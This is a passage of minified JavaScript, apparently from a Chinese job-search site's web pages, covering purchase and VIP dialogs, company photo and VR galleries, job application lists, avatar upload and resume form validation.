                        onConfirm: function(e) {
                            try {
                                _T.sendEvent("use_item_tips")
                            } catch (e) {}
                            var t = {
                                targetId: i.zpData.targetId
                            };
                            n(t)
                        },
                        onCancel: function(e) {
                            try {
                                _T.sendEvent("on_second_thought_item_tips")
                            } catch (e) {}
                            e.remove()
                        }
                    }) : ItemShop.analyzer(function() {
                        try {
                            _T.sendEvent("item_pay_buy_competitive_detail")
                        } catch (e) {}
                        Payment.success({
                            article: "购买成功",
                            text: "是否确定对该职位使用竞争分析器？",
                            cancelText: "我再想想",
                            confirmText: "立即使用",
                            confirm: function(e) {
                                if ("confirm" == e) {
                                    try {
                                        _T.sendEvent("use_immediately_purchase_success")
                                    } catch (e) {}
                                    t().then(function(e) {
                                        var t;
                                        0 == e.zpData.status ? (t = {
                                            targetId: e.zpData.targetId
                                        },
                                        n(t, wrap)) : $.toast({
                                            content: e.message,
                                            type: "error"
                                        })
                                    })
                                } else
                                    try {
                                        _T.sendEvent("on_second_thought_purchase_success")
                                    } catch (e) {}
                            }
                        })
                    })
            })
        }))
    },
    showPop: function(t) {
        $.dialog({
            title: t.title,
            content: t.content,
            confirmText: t.confirmText,
            wrapClass: "layer-prop-tip",
            cancelText: !1,
            onOpen: function(e) {
                "function" == typeof t.callback && t.callback(e)
            }
        })
    },
    myActionLog: function(e) {
        try {
            $.ajax({
                method: "post",
                url: "/wapi/zpCommon/actionLog/common.json",
                data: {
                    ba: JSON.stringify(e)
                },
                cache: !1,
                success: function(e) {},
                error: function() {}
            })
        } catch (e) {}
    },
    getVipStatus: function() {
        $.post("/wapi/zpitem/web/geekVip/getSubscribeYellow", {
            encryptBrandId: $('input[id="encryptBrandId"]').val() || ""
        }, function(e) {
            0 == e.code && e.zpData.hasVip && Detail.showVipTip(e.zpData)
        })
    },
    showVipTip: function(e) {
        var t = "btn"
          , t = '<div class="detail-vip-tip"><div class="detail-vip-container"><button class="' + (t = e.subscribe ? "btn btn-outline" : t) + '">' + e.buttonText + "</button><i></i><span>" + e.yellowText + "</span></div></div>";
        $(".job-list").prepend(t),
        $(".job-list").on("click", ".detail-vip-container .btn", function() {
            var e = {
                elContainer: $(this).parents(".detail-vip-container"),
                encryptBrandId: $('input[id="encryptBrandId"]').val() || "",
                subscribe: $(this).hasClass("btn-outline") ? 1 : 0
            };
            Detail.changeVipStatus(e)
        })
    },
    changeVipStatus: function(e) {
        var t = {
            encryptBrandId: e.encryptBrandId,
            subscribe: e.subscribe
        }
          , i = e.elContainer;
        $.post("/wapi/zpitem/web/geekVip/subscribe", t, function(e) {
            0 == e.code ? (0 == t.subscribe ? $.toast({
                content: "该公司职位已订阅成功，新职位发布将实时提醒您",
                type: "success"
            }) : $.toast({
                content: "取消订阅成功",
                type: "success"
            }),
            i.find(".btn").text(e.zpData.buttonText),
            i.find("span").text(e.zpData.yellowText),
            e.zpData.subscribe ? i.find(".btn").addClass("btn-outline") : i.find(".btn").removeClass("btn-outline"),
            e.zpData.hasVip || i.parents(".detail-vip-tip").remove()) : $.toast({
                content: e.message,
                type: "error"
            })
        })
    },
    jobSubscribe: function(i) {
        var e = i.find('input[name="sceneStr"]').val()
          , t = i.find('input[name="filter"]').val();
        $.ajax({
            type: "GET",
            url: "/wapi/zpgeek/job/subscribe/qr.json",
            data: {
                filter: t,
                sceneStr: e
            },
            dataType: "json",
            success: function(e) {
                var t;
                0 == e.code ? (t = e.zpData,
                i.find("dt").append('<img src="/wflow/zpweixin/qrcode/getqrcode?content=' + t + '&w=140&h=140">')) : $.toast({
                    content: e.message,
                    type: "error"
                })
            }
        }),
        i.find(".close").on("click", function() {
            $.ajax({
                type: "GET",
                url: "/wapi/zpgeek/job/subscribe/tip/close.json",
                data: {},
                dataType: "json",
                success: function(e) {
                    i.fadeOut("fast")
                }
            })
        })
    },
    jobBlockHandle: function() {
        var e, t = window._STGY || {};
        if (2 == t.login_source) {
            var i = getQueryObject() || {};
            if (i.page && 1 < i.page)
                return
        }
        !(window._PAGE || {}).uid && t.login_source && (e = setTimeout(function() {
            $.get("/wapi/zpgeek/strategy/login.json", {
                source: t.login_source
            }, function(e) {
                0 == e.code && e.zpData && e.zpData.showLogin && ShowLoginDialog.showBossLogin({
                    params: {
                        pk: 1 == t.login_source ? "job_detail_block" : "job_search_block",
                        title: "立即登录，享受优质服务",
                        eventLog: {
                            p: "",
                            p2: 1 == t.login_source ? "job_detail_block" : "job_search_block"
                        }
                    }
                })
            }),
            clearTimeout(e)
        }, 3e3))
    }
});
function strTranslateDom(e) {
    var t = document.createElement("div");
    return t.innerHTML = e,
    t.childNodes[0]
}
$(function() {
    Detail.init(),
    Detail.showPropDetail(),
    Detail.hasSidFlowMask || Detail.jobBlockHandle(),
    $('input[id="encryptBrandId"]').length && Detail.getVipStatus();
    var a = !1;
    (window._STGY || {}).showVipSiderBanner && $.get("/wapi/zpitem/geek/vip/info", function(e) {
        var t, i, n;
        0 == e.code && e.zpData && e.zpData.geekVipInfo && (t = {
            title: "升级VIP",
            desc: "尊享" + (e = e.zpData.geekVipInfo).privilegeCount + "大求职权益",
            btnText: "去升级"
        },
        e.vipStatus && (t.title = "VIP已开通",
        t.desc = "有效期至<br/>" + e.endDate,
        t.btnText = "去查看"),
        t = '<div class="vip-guide"><div class="title">' + t.title + '</div><div class="desc">' + t.desc + '</div><a href="/web/geek/mall?pcSource=jobsider" class="btn" >' + t.btnText + "</a></div>",
        (i = document.querySelector("#main .job-box .sider")) && (i.appendChild(strTranslateDom(t)),
        e.vipStatus || (n = $(".vip-guide").offset().top - $(window).height(),
        $(document).scroll(function() {
            var e;
            a || (e = $(document).scrollTop(),
            n < e && (Detail.sendAction({
                action: "biz-item-exposure-SaleEntrance",
                p: "100",
                p2: "geek-vip-39"
            }),
            a = !0))
        }))))
    })
}),
$(function() {
    var g = location.origin + "/mpa/v3/html/virtual/vr-pc?encryptPictureId=";
    function e() {
        $(".page-gongsi").length && ($(window).scrollTop() >= $("#main").offset().top ? $(".page-gongsi").addClass("fixed-header") : $(".page-gongsi").removeClass("fixed-header"))
    }
    function v() {
        $("body").append(' <div class="vr-iframe-loading"><div class="tip-inner"><div class="boss-loading"><span class="component-b"></span><span class="component-o"></span><span class="component-s1"></span><span class="component-s2"></span></div></div></div>'),
        $("body").css("overflow", "hidden")
    }
    function w() {
        $(".vr-iframe-loading").length && $(".vr-iframe-loading").remove(),
        $("body").css("overflow", "auto")
    }
    $(window).scroll(function() {
        e()
    }),
    e(),
    $(".company-body-wrapper .company-photo li").on("click", function() {
        try {
            _T.sendEvent("pc-comdetailpage-comintro-photo-click")
        } catch (e) {}
        var e = navigator.userAgent
          , n = -1 < e.indexOf("compatible") && -1 < e.indexOf("MSIE")
          , a = -1 < e.indexOf("Trident") && -1 < e.indexOf("rv:11.0")
          , e = $(this).attr("data-type") || "image"
          , i = $(this).parent().find("li")
          , o = $(this).index()
          , s = ""
          , r = ""
          , t = '<div class="dialog-source-wrap">@@@</div>'
          , c = '<span class="page-info"><span class="page-num">@@num@@</span> / <span class="page-count">@@count@@</span></span>';
        function l(e) {
            $.dialog({
                title: "",
                content: e,
                confirmText: !1,
                cancelText: !1,
                wrapClass: "dialog-prop-default dialog-image-preview",
                closeText: !1,
                onOpen: function(t) {
                    function e(e) {
                        e.stopPropagation(),
                        $(this).toggleClass("auto-size"),
                        e.target.height > document.documentElement.clientHeight ? t.addClass("zoom-y") : t.removeClass("zoom-y")
                    }
                    r = t,
                    $(".image", t).off("click").on("click", e),
                    $(".video", t).off("click").on("click", e),
                    $(".btn-prev", t).off("click").on("click", d),
                    $(".btn-next", t).off("click").on("click", p),
                    $(".btn-cancel, .dialog-con", t).off("click").on("click", u),
                    i.length < 2 && $(".btn-prev, .btn-next", t).hide()
                }
            })
        }
        function d(e) {
            if (e.stopPropagation(),
            w(),
            o < 1)
                $.toast({
                    type: "warning",
                    content: "已经是第一页"
                });
            else {
                if ("vr" == i.eq(o).data("type")) {
                    e = i.filter(function(e) {
                        return e < o && "vr" != $(this).data("type")
                    }).first().index();
                    if (-1 == e)
                        return void $.toast({
                            type: "warning",
                            content: "已经是第一页"
                        });
                    o = e
                } else
                    o--;
                var e = i.eq(o)
                  , t = e.attr("data-type");
                "vr" === t && (s = e.attr("data-encryptpictureid"),
                f()),
                "image" !== t && "video" !== t || (m(),
                r && r.removeClass("zoom-y"),
                h(t, e).then(function(e) {
                    $(".dialog-image-preview").length ? ($(".dialog-source-wrap").html(e),
                    $(".page-num").html(o + 1)) : l(['<div class="dialog-source-wrap">' + e + "</div>", '<i class="icon-btn btn-prev"></i><i class="icon-btn btn-next"></i><i class="icon-btn btn-cancel"></i>', '<span class="page-info"><span class="page-num">' + (o + 1) + '</span> / <span class="page-count">' + i.length + "</span></span>"].join(" "))
                }))
            }
        }
        function p(e) {
            if (e.stopPropagation(),
            w(),
            o > i.length - 2)
                $.toast({
                    type: "warning",
                    content: "已经是最后一页"
                });
            else {
                if ("vr" == i.eq(o).data("type")) {
                    e = i.filter(function(e) {
                        return o < e && "vr" != $(this).data("type")
                    }).first().index();
                    if (-1 == e)
                        return void $.toast({
                            type: "warning",
                            content: "已经是最后一页"
                        });
                    o = e
                } else
                    o++;
                var e = i.eq(o)
                  , t = e.attr("data-type");
                "image" !== t && "video" !== t || (m(),
                r && r.removeClass("zoom-y"),
                h(t, e).then(function(e) {
                    $(".dialog-image-preview").length ? ($(".dialog-source-wrap").html(e),
                    $(".page-num").html(o + 1)) : l(['<div class="dialog-source-wrap">' + e + "</div>", '<i class="icon-btn btn-prev"></i><i class="icon-btn btn-next"></i><i class="icon-btn btn-cancel"></i>', '<span class="page-info"><span class="page-num">' + (o + 1) + '</span> / <span class="page-count">' + i.length + "</span></span>"].join(" "))
                })),
                "vr" === t && (s = e.attr("data-encryptpictureid"),
                f())
            }
        }
        function u() {
            r.remove()
        }
        function h(e, t) {
            var i, n, a, o, s, r = $.Deferred();
            return "image" === e ? (a = t.attr("data-poster"),
            r.resolve('<img src="' + a + '" class="image" />')) : "video" === e && (i = t.attr("data-poster") || "",
            n = t,
            o = $.Deferred(),
            (s = n.attr("data-src") || "") ? o.resolve(s) : (a = n.attr("data-brandvideoid") || "",
            v(),
            $.ajax({
                type: "POST",
                data: {
                    brandVideoId: a
                },
                url: "/wapi/zpboss/h5/brandComplete/video/playVideo",
                success: function(e) {
                    var t;
                    0 == e.code && e.zpData && e.zpData.playUrl && (t = e.zpData.playUrl.replace(/^https?:/, "")),
                    n.attr("data-src", t),
                    s = t
                },
                complete: function() {
                    o.resolve(s),
                    w()
                }
            })),
            o.then(function(e) {
                e = e ? '<video class="video" controls src="' + e + '" poster="' + i + '" playsinline="true" webkit-playsinline="true"></video>' : '<div class="empty-block"><img src="https://img.bosszhipin.com/static/file/2023/6zs9wp442g1678089281231.png" /><p>视频加载失败，请再次点击相册重试</p><em>请再次点击相册重试</em></div>';
                r.resolve(e)
            })),
            r
        }
        function f() {
            var e, t, i;
            s && (e = $("#vrWrap"),
            t = $(".VRIfram"),
            i = e.find(".empty-block"),
            n || a ? (i.length || e.append('<div class="empty-block"><img src="https://img.bosszhipin.com/static/file/2023/6zs9wp442g1678089281231.png" /><p>当前不支持此浏览器查看</p><em>请使用其它浏览器</em></div>'),
            t.hide()) : (i.length && i.remove(),
            i = g + s + "&t=" + (new Date).getTime(),
            t.unbind(),
            t.attr("src", i),
            t.show(),
            v(),
            t.load(function() {
                w()
            })),
            e.is(":hidden") && (e.show(),
            $("body").css("overflow", "hidden"),
            $(".vr-btn-cancel").on("click", m),
            $(".vr-btn-next").on("click", p),
            $(".vr-btn-prev").on("click", d),
            n || a || $(window).on("resize.vrResize", function(t, i, n) {
                var a;
                return function() {
                    var e = n || this;
                    clearTimeout(a),
                    a = setTimeout(function() {
                        a = null,
                        t.apply(e, arguments)
                    }, i)
                }
            }(function() {
                var e, t;
                s && (e = g + s + "&t=" + (new Date).getTime(),
                (t = $(".VRIfram")).attr("src", e),
                v(),
                t.load(function() {
                    w()
                }))
            }, 200))))
        }
        function m() {
            $("#vrWrap").hide(),
            $("body").css("overflow", "auto"),
            s = "",
            $(".vr-btn-cancel").unbind(),
            $(".vr-btn-next").unbind(),
            $(".vr-btn-prev").unbind(),
            $(window).off("resize.vrResize"),
            r && u()
        }
        "vr" === e ? (s = $(this).attr("data-encryptpictureid"),
        f()) : "image" !== e && "video" !== e || h(e, $(this)).then(function(e) {
            t = t.replace("@@@", e),
            c = c.replace("@@num@@", o + 1).replace("@@count@@", i.length),
            l([t, c, '<i class="icon-btn btn-prev"></i><i class="icon-btn btn-next"></i><i class="icon-btn btn-cancel"></i>'].join(" "))
        })
    }),
    $(".expect-btn").on("click", function() {
        _PAGE && !_PAGE.uid && ShowLoginDialog.showBossLogin({
            params: {
                pk: $(this).attr("ka") || ""
            }
        })
    }),
    $(".recruiter-list .view-more").on("click", function() {
        try {
            _T.sendEvent("pc-comdetailpage-comintro-moreonlinejob-click")
        } catch (e) {}
    }),
    $(".business-detail label").on("click", function() {
        var e = $(this).closest(".business-detail");
        if (e.toggleClass("show-business-all"),
        e.hasClass("show-business-all")) {
            $(this).find("span").text("收起"),
            $(this).find(".fz").removeClass("fz-slidedown").addClass("fz-slideup");
            try {
                _T.sendEvent("pc-comdetailpage-comintro-busiinfo-click")
            } catch (e) {}
        } else
            $(this).find("span").text("查看更多信息"),
            $(this).find(".fz").removeClass("fz-slideup").addClass("fz-slidedown")
    }),
    $(".company-info-box .fold-text + .more-view").each(function() {
        112 < $(this).parent().find(".fold-text").height() ? $(this).show() : $(this).hide()
    }).on("click", function() {
        $(this).parent().hasClass("expand") ? ($(this).parent().removeClass("expand"),
        $(this).html('展开<i class="fz fz-slidedown"></i>')) : ($(this).parent().addClass("expand"),
        $(this).html('收起<i class="fz fz-slideup"></i>'))
    });
    var t, i = $(".company-body-wrapper .company-photo .swiper-next-btn"), n = $(".company-body-wrapper .company-photo .swiper-prev-btn"), a = $(".company-body-wrapper .company-photo li").length, o = $(".company-body-wrapper .company-photo-list .swiper-wrapper"), s = (8 < a ? (o.addClass("swiper-wrapper-col").removeClass("swiper-wrapper-row"),
    t = new Swiper(".company-body-wrapper .company-photo .swiper-container",{
        slidesPerView: 2,
        simulateTouch: !1,
        onSwiperCreated: function(e) {
            8 < a && i.show()
        },
        onSlideChangeStart: function(e) {
            0 < e.activeIndex ? n.show() : n.hide();
            e = 4 * e.activeIndex;
            a - e <= 8 ? i.hide() : i.show()
        }
    }),
    n.on("click", function() {
        t.swipePrev()
    }),
    i.on("click", function() {
        var e = t.activeIndex;
        4 <= a - 4 * e - 8 ? t.swipeNext() : (e = t.getWrapperTranslate(),
        t.setWrapperTranslate(e - 200 - 4),
        i.hide(),
        n.show())
    })) : o.addClass("swiper-wrapper-row").removeClass("swiper-wrapper-col"),
    null);
    if ($(".company-banner .not-settled-tag").hover(function() {
        var e = $(this)[0].getBoundingClientRect() || {};
        s = $(".not-settled-content", $(this)).clone().appendTo("body").css({
            display: "block",
            left: e.left + "px",
            top: +e.top + +e.height + 4 + "px"
        })
    }, function() {
        s && s.remove()
    }),
    "cpc_company_intro" == $("#page_key_name").val())
        try {
            var r = (window._brandInfo || {}).brand_id || "";
            _T.sendEvent("pc-comdetailpage-expo", r)
        } catch (e) {}
});
var Deliver = {
    init: function() {
        0 != $(".deliver-list").length && (Deliver.isLoading = !1,
        Deliver.type = "list",
        Deliver.listContainer = $(".job-box"),
        Deliver.listWrap = Deliver.listContainer.find(".deliver-list"),
        Deliver.tipsContainer = Deliver.listWrap.find(".data-tips"),
        Deliver.listCon = Deliver.listWrap.find("ul"),
        Deliver.listMoreEl = Deliver.listWrap.find(".loadmore"),
        Deliver.para = {
            page: 0
        },
        Deliver.getData(1, !0),
        Deliver.listMoreEl.on("click", function() {
            Deliver.isLoading || Deliver.listMoreEl.hasClass("disabled") || Deliver.getData()
        }),
        Deliver.listCon.on("click", ".btn", function(e) {
            var t = $(this);
            Detail.startChat(t),
            e.preventDefault()
        }))
    },
    getData: function(i, e) {
        i && (Deliver.para.page = 0,
        Deliver.listCon.html(""),
        Deliver.listWrap.find(".user-list").hide(),
        Deliver.listWrap.find(".detail-box").hide()),
        Deliver.para.page++,
        Deliver.isLoading = !0,
        1 < Deliver.para.page && (Deliver.listMoreEl.addClass("disabled"),
        Deliver.listMoreEl.text("正在加载中...")),
        $.ajax({
            type: "GET",
            url: "/geek/deliveryinfo.json",
            dataType: "JSON",
            cache: !1,
            data: Deliver.para,
            success: function(e) {
                var t = "";
                1 == (e = e).rescode && (1 == e.hasMore ? Deliver.listMoreEl.removeClass("disabled").text("加载更多").show() : 1 < Deliver.para.page && Deliver.listMoreEl.addClass("disabled").text("没有更多了").show(),
                "" == e.html ? i && Deliver.tipsContainer.html('<div class="data-blank"><i class="tip-nodata"></i><b>没有相关数据</b></div>').show() : (t += e.html,
                Deliver.listCon.append(t),
                Deliver.tipsContainer.html("").hide()),
                i && Deliver.listCon.find("li").length < 10 && Deliver.listMoreEl.text("没有更多了").addClass("disabled").hide()),
                Deliver.isLoading = !1
            },
            error: function(e) {
                1 < Deliver.para.page && Deliver.listMoreEl.removeClass("disabled").text("数据加载出错").show(),
                Deliver.isLoading = !1,
                i && (Deliver.listMoreEl.hide(),
                Deliver.tipsContainer.html('<div class="data-blank"><i class="tip-errordata"></i><b>数据加载出错</b></div>').show())
            }
        })
    }
}
  , Validate = ($(function() {
    Deliver.init()
}),
$(function() {
    $(".ie").length && (window.IE = !0);
    function a() {
        $.dialog({
            type: "info",
            title: "新头像已提交审核",
            content: '<div class="tip-text">头像修改已提交审核，审核通过后自动更新您的信息</div>',
            closeText: !0,
            confirmText: "知道了",
            cancelText: "",
            closeLayer: !1,
            preKa: "",
            wrapClass: "dialog-icons-default dialog-avatar-tip",
            lock: !0,
            onOpen: function(e) {},
            onConfirm: function(e) {
                e.remove()
            },
            onClose: function(e) {}
        })
    }
    $(".avatar_box").on("click", function() {
        var e, i;
        $(".profile_form").length ? window.IE ? $.initUploadPortrait({
            title: "上传照片",
            url: $("[upload]").attr("upload"),
            callback: function(e, t) {
                var i, n = $(".profile_form .avatar_line img.avatar");
                0 < $("#user_info").length && $(window.parent.document).find(".aside_nav_bar .avatar img").attr("src", e[0]),
                $(".resume-box").length && (i = n.closest("form"),
                $.ajax({
                    type: "POST",
                    url: i.attr("action"),
                    dataType: "JSON",
                    data: {
                        tiny: e[0],
                        large: e[1]
                    },
                    success: function(e) {
                        1 == e.rescode && (n.attr("src", e.url[1]),
                        n.closest("dd").find("input:hidden[name=large]").val(e.url[1]),
                        n.closest("dd").find("input:hidden[name=tiny]").val(e.url[0]),
                        n.closest("dd").find(".error_hint").html("").hide(),
                        e.verifyTip && a())
                    },
                    error: function(e) {}
                }))
            }
        }) : crop.show({
            callback: function(e) {
                e && $.post($("[upload-base64-url]").attr("upload-base64-url"), {
                    data: e
                }, function(e) {
                    var t;
                    e.rescode ? ((t = $(".profile_form .avatar_line img.avatar")).attr("src", e.url[0]),
                    t.closest("dd").find("input:hidden[name=tiny]").val(e.url[0]),
                    t.closest("dd").find("input:hidden[name=large]").val(e.url[1]),
                    0 < $("#user_info").length && $(window.parent.document).find(".aside_nav_bar .avatar img").attr("src", e.url[0]),
                    e.verifyTip && a()) : alert("图片保存失败")
                }, "json")
            }
        }) : window.IE ? $.initUploadPortrait({
            title: "上传照片",
            url: $("[upload]").attr("upload"),
            callback: function(e, t) {
                var i = $(".profile_form .avatar_line img.avatar");
                i.attr("src", e[1]),
                i.closest("dd").find("input:hidden[name=large]").val(e[1]),
                i.closest("dd").find("input:hidden[name=tiny]").val(e[0]),
                i.closest("dd").find(".error_hint").html("").hide(),
                t && t.verifyTip && a()
            }
        }) : (e = $(".avatar_layer"),
        i = $(this),
        crop.show({
            element: i,
            defaultAvatarHtml: e,
            callback: function(e) {
                e && $.post($("[upload-base64-url]").attr("upload-base64-url"), {
                    data: e
                }, function(e) {
                    var t;
                    e.rescode ? ((t = $(".avatar_box .avatar img")).attr("src", e.url[0]),
                    t.closest("dd").find("input:hidden[name=tiny]").val(e.url[0]),
                    t.closest("dd").find("input:hidden[name=large]").val(e.url[1]),
                    i.find(".tip-text").remove(),
                    e.verifyTip && a()) : alert("图片保存失败")
                }, "json")
            }
        }))
    })
}),
{
    init: function(e, n, a) {
        var o = e
          , s = o.find("input,textarea");
        o.on("submit", function(e) {
            var t = !1;
            if (s.each(function() {
                if ($(this).val($(this).val().replace(/(^[\s\n\r]*)|([\s\n\r]*$)/g, "")),
                !$(this).attr("disabled") && ($(this).hasClass("required") || $(this).attr("data-range")) && !Validate.check($(this), !0))
                    return t = !1;
                t = !0
            }),
            t) {
                if (-1 < o.attr("action").indexOf("/geek/user/save.json") && o.find("input[name=name]").length && !o.find("input[name=name]").hasClass("disabled")) {
                    var i = $("input[name=name]").val();
                    if (Auxiliary.getByteLength(i) < 4)
                        return $.toast({
                            type: "error",
                            content: "姓名应为2-12个汉字或4-24个字母"
                        }),
                        !1
                }
                a ? Guide.postData(o, n) : (Resume.postData(o, n),
                Resume.formStatus = !1)
            } else {
                i = $(".tip-text");
                i.length && $("body,html").stop().animate({
                    scrollTop: i.offset().top - i.closest("dl").height()
                })
            }
            e.preventDefault()
        }),
        s.each(function() {
            var e = $(this).closest("dd").find(".count-num");
            $(this).attr("disabled") || !$(this).hasClass("required") && !$(this).attr("data-range") || (n || Validate.check($(this), !1, e),
            $(this).bind("input keyup", function() {
                Validate.check($(this), !1, e)
            }))
        }),
        o.find(".form-btns .btn-back").on("click", function() {
            o.closest(".resume-item").removeClass("resume-item-open")
        }),
        o.find('input[name="locationName"]').on("blur", function() {
            "" != $(this).val() && "" == $(this).parent().find('input[name="location"]').val() ? ($(this).val(""),
            Validate.showError($(this), "请输入正确的城市")) : Validate.hideError($(this))
        }),
        o.find('input[name="degree"]').closest("dd").find(".dropdown-menu li").on("click", function() {
            "206" == $(this).attr("data-val") || "209" == $(this).attr("data-val") ? (o.find('input[name="major"]').addClass("disabled").val("").attr("disabled", "disabled"),
            Validate.hideError(o.find('input[name="major"]'))) : o.find('input[name="major"]').removeClass("disabled").removeAttr("disabled"),
            o.find('.ipt-range, input[name="startDateCode"], input[name="endDateCode"]').val("")
        })
    },
    getLength: function(e) {
        for (var t = 0, i = (e = e.replace(/(^[\s\n\r]*)|([\s\n\r]*$)/g, "")).length, n = 0; n < i; n++)
            t += 255 < e.charCodeAt(n) ? 1 : .5;
        return Math.ceil(t)
    },
    check: function(e, t, i) {
        var n = (e = e).attr("data-range")
          , a = Validate.getLength(e.val().trim())
          , o = e.val().replace(/(\s*$)/g, "");
        if (e.hasClass("required") && "" == o && t)
            return Validate.showError(e, e.attr("data-blank")),
            !1;
        if (Validate.hideError(e),
        "locationName" == e.attr("name") && "" != o && "" == e.parent().find('input[name="location"]').val())
            return Validate.showError(e, "请输入正确的城市"),
            !1;
        if (t && "gender" == e.attr("name") && Number(o) < 0)
            return Validate.showError(e, e.attr("data-blank")),
            !1;
        if (n) {
            if (n = n.split(","),
            i && i.length && i.html("<em" + (a > n[1] ? ' class="red"' : "") + ">" + a + "</em>/" + n[1]),
            a > n[1] || a < n[0])
                return Validate.showError(e, "请输入 " + n[0] + "-" + n[1] + " 个字"),
                !1;
            Validate.hideError(e)
        }
        return !0
    },
    showError: function(e, t) {
        var t = '<div class="tip-text">' + t + "</div>"
          , i = e.closest("dd").length ? e.closest("dd") : e.closest(".form-row");
        Validate.hideError(e),
        i.find(".tip-text").remove(),
        $(t).appendTo(i),
        e.addClass("ipt-error"),
        $(".babresume-warning") && $(".babresume-warning").hide()
    },
    hideError: function(e) {
        e.closest("dd").find(".tip-text").remove(),
        e.removeClass("ipt-error")
    }
})
  , FormsUI = ($(function() {
    $(".form-resume").each(function() {
        Validate.init($(this))
    })
}),
{
    eq: 0,
    appointedBlueCollarPosition: [],
    init: function(e) {
        var t, e = e || $(document);
        this.dropSelect(e),
        this.prettyRadio(e),
        (this.formEl = e).find(".ipt-datetimepicker").length && (t = new Date,
        nowYear = t.getFullYear(),
        nowMonth = t.getMonth() + 1,
        nowThisDate = t.getDate(),
        e.find(".ipt-datetimepicker").each(function(e) {
            var n = $(this)
              , t = e
              , e = n.attr("data-format") || "yyyy-mm-dd"
              , a = n.hasClass("date-range")
              , o = n.attr("data-today")
              , i = n.attr("data-type")
              , s = n.attr("data-minYear") || !1
              , r = 2
              , c = 2;
            n.datetimepicker({
                format: e,
                startView: r = i && "y-m-d" == i || "y-m" == i ? 4 : r,
                minView: c = "yyyy-mm" == e ? 3 : c,
                autoclose: 1,
                weekStart: 1,
                minLimitYear: s,
                todayHighlight: !0,
                container: _PAGE && _PAGE.isGeekChat ? "#resume-history" : "body",
                endDate: nowYear + "-" + nowMonth + "-" + nowThisDate,
                todayBtn: o ? 1 : 0
            }).on("changeDate", function(e) {
                n.closest("dd").find(".tip-text").hide();
                var t, i = n.closest(".form-row").find(".date-range").eq(0);
                if (o) {
                    if (new Date(e.date) < new Date(i.val()))
                        return alert("结束时间不能小于开始时间"),
                        !1
                } else
                    a && "startDate" == n.attr("name") && (t = n.closest(".form-row").find(".date-range").eq(1),
                    new Date(e.date).getFullYear() == (new Date).getFullYear() && new Date(e.date).getMonth() == (new Date).getMonth() ? (t.parent().addClass("show-prefix-today"),
                    t.parent().find('input[name="now"]').val("1"),
                    t.removeClass("required")) : (t.parent().removeClass("show-prefix-today"),
                    t.parent().find('input[name="now"]').val(""),
                    t.addClass("required")),
                    "1989-01" == n.val() ? t.datetimepicker("setStartDate", "1990-01") : t.datetimepicker("setStartDate", n.val()));
                a && "endDate" == n.attr("name") && (new Date(e.date).getFullYear() == (new Date).getFullYear() && new Date(e.date).getMonth() == (new Date).getMonth() ? (n.parent().addClass("show-prefix-today"),
                n.parent().find('input[name="now"]').val("1"),
                n.removeClass("required")) : (n.parent().removeClass("show-prefix-today"),
                n.parent().find('input[name="now"]').val(""),
                n.addClass("required"))),
                $(e.target).attr("data-minyear") && (new Date(e.date).getFullYear() <= 1989 ? i.parent().addClass("show-prefix-minyear") : i.parent().removeClass("show-prefix-minyear"))
            }),
            "birthday" == n.attr("name") && (n.datetimepicker("setStartDate", "1950-01"),
            n.datetimepicker("setEndDate", nowYear - 15 + "-12")),
            a && "startDate" == n.attr("name") && n.datetimepicker("setStartDate", "1989-01"),
            a && "endDate" == n.attr("name") && ("" == n.val() && "" == n.closest(".form-row").find(".date-range").eq(0).val() ? n.datetimepicker("setStartDate", "1990-01") : n.datetimepicker("setStartDate", n.closest(".form-row").find(".date-range").eq(0).val())),
            n.parent().find(".prefix-minyear,.prefix-today").on("click", function(e) {
                if (!$(".datetimepicker").eq(t).is(":visible"))
                    return setTimeout(function() {
                        n.datetimepicker("show")
                    }, 1),
                    !1;
                n.datetimepicker("hide")
            }),
            n.on("click", function() {
                $(".workstartpicker-wrap").hide().removeClass("month-panel")
            })
        })),
        e.find(".ipt-workyear").length && e.find(".ipt-workyear").workstartpicker(),
        e.find(".start-salary").on("click", "li", function() {
            FormsUI.changeSalary($(this).attr("data-val"))
        }),
        FormsUI.setMinSlary(),
        e.find(".select-industry .industry-cells").on("click", "span", function() {
            var e = $(this).closest("dd");
            $(this).hasClass("selected") ? ($(this).removeClass("selected"),
            e.find(".select-industry .industry-title h3").removeClass("red"),
            e.find(".select-industry .industry-title p.gray").removeClass("red").text("最多可选 3 个技能标签")) : 2 < e.find(".select-industry .industry-cells .selected").length ? (e.find(".select-industry .industry-title h3").addClass("red"),
            e.find(".select-industry .industry-title p.gray").addClass("red").text("最多可选 3 个技能标签")) : $(this).addClass("selected")
        }),
        e.find(".select-industry .industry-title").on("click", ".btn", function(e) {
            e.preventDefault();
            var t, i, n, a, e = $(this).closest("dd"), o = e.find(".industry-title .ipt"), s = !1;
            "确定" == $(this).text() ? (t = [],
            i = [],
            e.find(".select-industry .industry-cells .selected").each(function() {
                t.push($(this).text()),
                i.push($(this).attr("data-val") || $(this).text())
            }),
            t.length || (t.push("不限"),
            i.push("0")),
            e.find(".select-industry").closest("dd").find(".dropdown-select .ipt").val(t.join("·")),
            e.find(".select-industry").closest("dd").find('.dropdown-select input[type="hidden"]').val(i.join("·")),
            e.find(".select-industry").closest("dd").find(".dropdown-select").removeClass("dropdown-select-open"),
            e.find(".select-industry").closest("dd").find(".dropdown-menu").removeClass("dropdown-menu-open")) : "取消" == $(this).text() ? (e.find(".select-industry").closest("dd").find(".dropdown-select").removeClass("dropdown-select-open"),
            e.find(".select-industry").closest("dd").find(".dropdown-menu").removeClass("dropdown-menu-open")) : $(this).hasClass("btn-addtag") && (n = Validate.getLength(o.val()),
            a = e.find(".select-industry .industry-title p.gray"),
            "" == o.val().replace(/(\s*$)/g, "") ? (a.text("请输入标签名称").addClass("red"),
            o.val("")) : 6 < n ? a.text("请输入不超过6个字的标签名称").addClass("red") : (e.find(".select-industry .industry-cells span").each(function() {
                s = $(this).text() == o.val()
            }),
            s ? a.addClass("red").text("该标签已存在") : (e.find(".industry-cells .blank-tag").remove(),
            a.text("最多可选 3 个技能标签"),
            2 < e.find(".select-industry .industry-cells .selected").length ? a.addClass("red") : (a.removeClass("red"),
            e.find(".industry-cells").prepend('<span class="selected">' + o.val() + "</span>"),
            o.val("")))))
        }),
        e.find(".ipt-autocomplete").on("input keyup", function() {
            var e = $(this);
            FormsUI.suggestTimer && clearTimeout(FormsUI.suggestTimer),
            FormsUI.suggestTimer = setTimeout(function() {
                e.parent().find('input[type="hidden"]').val(""),
                FormsUI.getSuggest(e)
            }, 200)
        }),
        e.find(".suggest-complete").on("click", "li", function() {
            FormsUI.setSuggest($(this))
        }),
        FormsUI.initIndustry(e)
    },
    initIndustry: function(e) {
